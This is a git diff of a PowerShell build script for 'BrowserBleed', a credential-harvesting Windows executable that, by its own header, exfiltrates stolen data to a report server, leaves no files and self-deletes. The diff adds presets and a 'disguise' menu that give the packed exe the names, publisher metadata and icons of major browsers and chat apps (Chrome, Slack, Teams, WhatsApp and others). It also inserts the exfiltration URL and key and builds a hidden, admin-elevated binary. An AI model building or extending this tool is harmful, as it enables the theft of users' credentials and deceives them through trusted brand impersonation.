@@ -1,30 +1,228 @@
 # build_windows.ps1 — builds a credential-harvesting exe with the report server baked in.
 # Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
-#   .\build_windows.ps1
+#   .\build_windows.ps1 -Preset chrome
 #
 # The resulting exe auto-exfils on every run, leaves no local files, and self-deletes.
 # Override at runtime with: --out PATH  --no-self-delete  --exfil URL  --exfil-key KEY
 #
-# Common examples:
-#   .\build_windows.ps1                                        # chrome_crashpad_handler.exe
-#   .\build_windows.ps1 -ExeName RuntimeBroker                # RuntimeBroker.exe (Microsoft metadata)
-#   .\build_windows.ps1 -ExeName MicrosoftEdgeUpdate          # Edge update process
-#   .\build_windows.ps1 -ExeName chrome_crashpad_handler `
-#       -IconFile "C:\Program Files\Google\Chrome\Application\chrome.exe"
+# Available presets:
+#   Browsers:  chrome, edge, brave, firefox, opera
+#   Chat:      slack, discord, teams, zoom, whatsapp, telegram
+#
+# Examples:
+#   .\build_windows.ps1 -Preset chrome
+#   .\build_windows.ps1 -Preset slack
+#   .\build_windows.ps1 -Preset teams -ExfilUrl https://reports.example.com -ExfilKey mykey
+#   .\build_windows.ps1 -ExeName svchost -Company "Microsoft Corporation" -FileDesc "Host Process for Windows Services"
 
 param(
+    [string]$Preset    = "",
     [string]$ExfilUrl  = "",
     [string]$ExfilKey  = "",
-    [string]$ExeName   = "chrome_crashpad_handler",
-    [string]$IconFile  = "",    # path to .ico or .exe to extract icon from
-    [string]$Company   = "",    # override CompanyName in Properties (auto-set by preset)
-    [string]$FileDesc  = ""     # override FileDescription in Properties (auto-set by preset)
+    [string]$ExeName   = "",
+    [string]$IconFile  = "",    # path to .ico or .exe to extract icon from (auto-set by preset)
+    [string]$Company   = "",    # CompanyName in Properties (auto-set by preset)
+    [string]$FileDesc  = ""     # FileDescription in Properties (auto-set by preset)
 )
 
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
-# ── Load deploy/config if values not passed in ────────────────────────────────
+# ── Preset definitions ────────────────────────────────────────────────────────
+$presetDefs = @{
+    # Browsers
+    "chrome"    = @{
+        ExeName   = "chrome_crashpad_handler"
+        Company   = "Google LLC"
+        Desc      = "Google Chrome"
+        IconPaths = @(
+            "C:\Program Files\Google\Chrome\Application\chrome.exe",
+            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+        )
+    }
+    "edge"      = @{
+        ExeName   = "msedge_crashpad_handler"
+        Company   = "Microsoft Corporation"
+        Desc      = "Microsoft Edge"
+        IconPaths = @(
+            "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+            "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
+        )
+    }
+    "brave"     = @{
+        ExeName   = "brave_crashpad_handler"
+        Company   = "Brave Software, Inc"
+        Desc      = "Brave Browser"
+        IconPaths = @(
+            "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
+        )
+    }
+    "firefox"   = @{
+        ExeName   = "plugin-container"
+        Company   = "Mozilla Corporation"
+        Desc      = "Mozilla Firefox"
+        IconPaths = @(
+            "C:\Program Files\Mozilla Firefox\firefox.exe",
+            "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
+        )
+    }
+    "opera"     = @{
+        ExeName   = "opera_crashpad_handler"
+        Company   = "Opera Software AS"
+        Desc      = "Opera internet browser"
+        IconPaths = @(
+            "$env:LOCALAPPDATA\Programs\Opera\opera.exe",
+            "C:\Program Files\Opera\opera.exe"
+        )
+    }
+    # Chat apps
+    "slack"     = @{
+        ExeName   = "slack"
+        Company   = "Slack Technologies, Inc."
+        Desc      = "Slack"
+        IconPaths = @(
+            "$env:LOCALAPPDATA\slack\slack.exe"
+        )
+    }
+    "discord"   = @{
+        ExeName   = "Discord"
+        Company   = "Discord Inc."
+        Desc      = "Discord"
+        IconPaths = @(
+            "$env:LOCALAPPDATA\Discord\app-*\Discord.exe",
+            "$env:LOCALAPPDATA\Discord\Update.exe"
+        )
+    }
+    "teams"     = @{
+        ExeName   = "ms-teams"
+        Company   = "Microsoft Corporation"
+        Desc      = "Microsoft Teams"
+        IconPaths = @(
+            "$env:LOCALAPPDATA\Microsoft\Teams\current\Teams.exe",
+            "C:\Program Files\Microsoft\Teams\current\Teams.exe",
+            "$env:LOCALAPPDATA\Microsoft\WindowsApps\ms-teams.exe"
+        )
+    }
+    "zoom"      = @{
+        ExeName   = "Zoom"
+        Company   = "Zoom Video Communications, Inc."
+        Desc      = "Zoom"
+        IconPaths = @(
+            "$env:APPDATA\Zoom\bin\Zoom.exe",
+            "C:\Program Files\Zoom\bin\Zoom.exe",
+            "C:\Program Files (x86)\Zoom\bin\Zoom.exe"
+        )
+    }
+    "whatsapp"  = @{
+        ExeName   = "WhatsApp"
+        Company   = "WhatsApp LLC"
+        Desc      = "WhatsApp"
+        IconPaths = @(
+            "$env:LOCALAPPDATA\WhatsApp\WhatsApp.exe"
+        )
+    }
+    "telegram"  = @{
+        ExeName   = "Telegram"
+        Company   = "Telegram FZ-LLC"
+        Desc      = "Telegram Desktop"
+        IconPaths = @(
+            "$env:APPDATA\Telegram Desktop\Telegram.exe"
+        )
+    }
+}
+
+# ── Apply preset ──────────────────────────────────────────────────────────────
+if ($Preset) {
+    $key = $Preset.ToLower()
+    if (-not $presetDefs.ContainsKey($key)) {
+        Write-Host "Unknown preset '$Preset'. Available presets:"
+        Write-Host "  Browsers: chrome, edge, brave, firefox, opera"
+        Write-Host "  Chat:     slack, discord, teams, zoom, whatsapp, telegram"
+        exit 1
+    }
+    $def = $presetDefs[$key]
+    if (-not $ExeName)  { $ExeName  = $def.ExeName }
+    if (-not $Company)  { $Company  = $def.Company }
+    if (-not $FileDesc) { $FileDesc = $def.Desc    }
+    if (-not $IconFile) {
+        foreach ($pattern in $def.IconPaths) {
+            $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($found) { $IconFile = $found.FullName; break }
+        }
+        if (-not $IconFile) {
+            Write-Host "[!] $($def.Desc) not found on this machine — building without icon"
+        }
+    }
+}
+
+# ── Interactive preset menu (shown when no -Preset or -ExeName given) ─────────
+if (-not $ExeName -and -not $Preset) {
+    $menuItems = [ordered]@{
+        1  = "chrome"
+        2  = "edge"
+        3  = "brave"
+        4  = "firefox"
+        5  = "opera"
+        6  = "slack"
+        7  = "discord"
+        8  = "teams"
+        9  = "zoom"
+        10 = "whatsapp"
+        11 = "telegram"
+    }
+
+    Write-Host ""
+    Write-Host "Select a disguise preset:"
+    Write-Host ""
+    Write-Host "  BROWSERS"
+    Write-Host "  [1]  Chrome     - chrome_crashpad_handler  (Google LLC)"
+    Write-Host "  [2]  Edge       - msedge_crashpad_handler  (Microsoft Corporation)"
+    Write-Host "  [3]  Brave      - brave_crashpad_handler   (Brave Software, Inc)"
+    Write-Host "  [4]  Firefox    - plugin-container         (Mozilla Corporation)"
+    Write-Host "  [5]  Opera      - opera_crashpad_handler   (Opera Software AS)"
+    Write-Host ""
+    Write-Host "  CHAT APPS"
+    Write-Host "  [6]  Slack      - slack                    (Slack Technologies, Inc.)"
+    Write-Host "  [7]  Discord    - Discord                  (Discord Inc.)"
+    Write-Host "  [8]  Teams      - ms-teams                 (Microsoft Corporation)"
+    Write-Host "  [9]  Zoom       - Zoom                     (Zoom Video Communications)"
+    Write-Host "  [10] WhatsApp   - WhatsApp                 (WhatsApp LLC)"
+    Write-Host "  [11] Telegram   - Telegram                 (Telegram FZ-LLC)"
+    Write-Host ""
+    $choice = Read-Host "Enter number"
+
+    if ($menuItems.Contains([int]$choice)) {
+        $Preset = $menuItems[[int]$choice]
+        $key    = $Preset.ToLower()
+        $def    = $presetDefs[$key]
+        if (-not $ExeName)  { $ExeName  = $def.ExeName }
+        if (-not $Company)  { $Company  = $def.Company }
+        if (-not $FileDesc) { $FileDesc = $def.Desc    }
+        if (-not $IconFile) {
+            foreach ($pattern in $def.IconPaths) {
+                $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($found) { $IconFile = $found.FullName; break }
+            }
+            if (-not $IconFile) {
+                Write-Host "[!] $($def.Desc) not found on this machine — building without icon"
+            }
+        }
+    } else {
+        Write-Error "Invalid selection. Run again and enter a number from the list."
+        exit 1
+    }
+}
+
+if (-not $ExeName) {
+    Write-Error "Specify -Preset, -ExeName, or run without arguments for the interactive menu."
+    exit 1
+}
+
+# ── Fallback metadata ─────────────────────────────────────────────────────────
+if (-not $Company)  { $Company  = "Microsoft Corporation" }
+if (-not $FileDesc) { $FileDesc = $ExeName                }
+
+# ── Load deploy/config if exfil values not passed in ─────────────────────────
 if (-not $ExfilUrl -or -not $ExfilKey) {
     $configPath = Join-Path $PSScriptRoot "deploy\config"
     if (Test-Path $configPath) {
@@ -38,33 +236,12 @@ if (-not $ExfilUrl -or -not $ExfilKey) {
 if (-not $ExfilUrl) { Write-Error "ExfilUrl not set — add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
 if (-not $ExfilKey) { Write-Error "ExfilKey not set — add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }
 
-# ── Metadata presets (auto-populates Properties / Task Manager Description) ───
-$presets = @{
-    "chrome_crashpad_handler" = @{ Company = "Google LLC";            Desc = "Google Chrome"                          }
-    "chrome"                  = @{ Company = "Google LLC";            Desc = "Google Chrome"                          }
-    "GoogleUpdate"            = @{ Company = "Google LLC";            Desc = "Google Update"                          }
-    "MicrosoftEdgeUpdate"     = @{ Company = "Microsoft Corporation"; Desc = "Microsoft Edge Update"                  }
-    "RuntimeBroker"           = @{ Company = "Microsoft Corporation"; Desc = "Runtime Broker"                         }
-    "SearchIndexer"           = @{ Company = "Microsoft Corporation"; Desc = "Microsoft Windows Search Indexer"       }
-    "svchost"                 = @{ Company = "Microsoft Corporation"; Desc = "Host Process for Windows Services"      }
-    "MsMpEng"                 = @{ Company = "Microsoft Corporation"; Desc = "Antimalware Service Executable"         }
-    "OneDrive"                = @{ Company = "Microsoft Corporation"; Desc = "Microsoft OneDrive"                     }
-    "Teams"                   = @{ Company = "Microsoft Corporation"; Desc = "Microsoft Teams"                        }
-}
-
-if ($presets.ContainsKey($ExeName)) {
-    if (-not $Company)   { $Company  = $presets[$ExeName].Company }
-    if (-not $FileDesc)  { $FileDesc = $presets[$ExeName].Desc    }
-} else {
-    if (-not $Company)   { $Company  = "Microsoft Corporation" }
-    if (-not $FileDesc)  { $FileDesc = $ExeName                }
-}
-
 Write-Host "[*] Building $ExeName.exe"
 Write-Host "    Exfil URL:    $ExfilUrl"
 Write-Host "    Exfil key:    $($ExfilKey.Substring(0,4))****"
 Write-Host "    Process name: $ExeName"
 Write-Host "    Description:  $FileDesc ($Company)"
+if ($IconFile) { Write-Host "    Icon:         $IconFile" }
 
 # ── Patch a temp copy of the source ──────────────────────────────────────────
 $src    = Join-Path $PSScriptRoot "BrowserBleed.py"
@@ -75,7 +252,7 @@ $tmpSrc = Join-Path $env:TEMP "BrowserBleed_build.py"
     -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`"" |
     Set-Content -Path $tmpSrc -Encoding utf8
 
-# ── Generate version-info file (sets Description + Company in Properties) ────
+# ── Generate version-info file ────────────────────────────────────────────────
 $verFile = Join-Path $env:TEMP "bb_version.txt"
 @"
 VSVersionInfo(
@@ -100,8 +277,8 @@ VSVersionInfo(
 "@ | Set-Content -Path $verFile -Encoding utf8
 
 # ── Build ─────────────────────────────────────────────────────────────────────
-$buildTmp  = Join-Path $env:TEMP "bb_build"
-$iconArgs  = if ($IconFile -and (Test-Path $IconFile)) { @("--icon", $IconFile) } else { @() }
+$buildTmp = Join-Path $env:TEMP "bb_build"
+$iconArgs = if ($IconFile -and (Test-Path $IconFile)) { @("--icon", $IconFile) } else { @() }
 
 python -m PyInstaller `
     --onefile --noconsole --uac-admin `
@@ -113,8 +290,8 @@ python -m PyInstaller `
     --specpath $buildTmp `
     $tmpSrc
 
-Remove-Item $tmpSrc  -Force -ErrorAction SilentlyContinue
-Remove-Item $verFile -Force -ErrorAction SilentlyContinue
+Remove-Item $tmpSrc   -Force -ErrorAction SilentlyContinue
+Remove-Item $verFile  -Force -ErrorAction SilentlyContinue
 Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
